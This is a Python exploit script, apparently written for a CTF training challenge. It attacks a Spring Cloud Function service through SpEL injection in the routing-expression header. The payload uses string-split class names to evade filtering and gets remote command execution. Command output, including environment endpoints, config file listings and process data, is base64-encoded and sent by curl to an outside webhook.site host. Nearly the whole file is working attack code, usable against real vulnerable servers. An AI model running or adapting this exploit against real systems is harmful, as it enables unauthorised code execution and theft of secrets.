#!/usr/bin/env python3
"""
CTF Chile - Descubrimiento de APIs de OmniVault
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:20} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Explorando endpoints internos...")
# Probar endpoints comunes del localhost
probe("localhost_root", "curl -s http://localhost:8080/ | head -10")
probe("localhost_api", "curl -s http://localhost:8080/api | head -5")
probe("localhost_actuator", "curl -s http://localhost:8080/actuator | head -5")
probe("localhost_health", "curl -s http://localhost:8080/actuator/health")
probe("localhost_env", "curl -s http://localhost:8080/actuator/env | head -20")
probe("localhost_info", "curl -s http://localhost:8080/actuator/info")

print("[*] Buscando archivos de configuración...")
probe("spring_config", "find /app -name '*.properties' -o -name '*.yml' 2>/dev/null | xargs ls -la")
probe("temp_files", "ls -la /tmp/")
probe("proc_cmdline", "cat /proc/1/cmdline | tr '\\0' ' '")

print("[*] Explorando posibles rutas del vault...")
probe("vault_api", "curl -s http://localhost:8080/api/vault | head -5")
probe("vault_admin", "curl -s http://localhost:8080/admin | head -5")
probe("vault_flag", "curl -s http://localhost:8080/flag | head -5")
probe("vault_secret", "curl -s http://localhost:8080/secret | head -5")

print("[*] Verificando procesos y servicios...")
probe("ps_aux", "ps aux")
probe("listening_ports", "ss -tuln")

time.sleep(10)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=20", timeout=10)
data = r.json().get("data", [])

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)
            # Buscar flags en el contenido decodificado
            if "ctfchile{" in decoded.lower() or "flag{" in decoded.lower():
                print("🚩 POSSIBLE FLAG FOUND! 🚩")
        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")